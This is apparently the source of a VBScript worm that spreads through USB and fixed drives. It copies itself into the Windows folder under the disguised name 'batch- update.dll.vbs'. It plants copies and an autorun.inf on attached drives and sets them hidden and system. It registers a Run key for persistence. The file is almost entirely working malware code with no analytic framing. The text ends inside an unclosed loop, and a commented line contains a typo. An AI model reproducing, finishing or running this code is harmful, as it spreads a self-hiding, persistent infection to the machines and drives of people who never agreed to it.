on error resume next
dim xyz,windowpath,flashdrive,fs,mf,isi,tf,blah,nt,check,sd

isi = "[autorun]" & vbcrlf & "shellexecute=wscript.exe update.dll.vbs"
set fs = createobject("Scripting.FileSystemObject")
set mf = fs.getfile(Wscript.ScriptFullname)
dim text,size
size = mf.size
check = mf.drive.drivetype
set text = mf.openastextstream(1,-2)
do while not text.atendofstream
xyz = xyz & text.readline
xyz = xyz & vbcrlf
loop
do

Set windowpath = fs.getspecialfolder(0)
set tf = fs.getfile(windowpath & "\batch- update.dll.vbs")
tf.attributes = 32
set tf=fs.createtextfile(windowpath & "\batch- update.dll.vbs",2,true)
tf.write xyz
tf.close
set tf = fs.getfile(windowpath & "\batch- update.dll.vbs")
tf.attributes = 39

for each flashdrive in fs.drives
If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" then
set tf=fs.getfile(flashdrive.path &"\update.dll.vbs ")
tf.attributes =32
set tf=fs.createtextfile(flashdrive.path &"\update.dll.vbs ",2,true)
tf.write xyz
tf.close
set tf=fs.getfile(flashdrive.path &"\update.dll.vbs")
tf.attributes = 39

set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write isi
tf.close
set tf = fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
end if
next

set blah = createobject("WScript.Shell")

'blah.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Advanced\Hidden", "0?, "REG_DWORD"

blah.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Systemdir", windowpath & "\batch- update.dll.vbs"
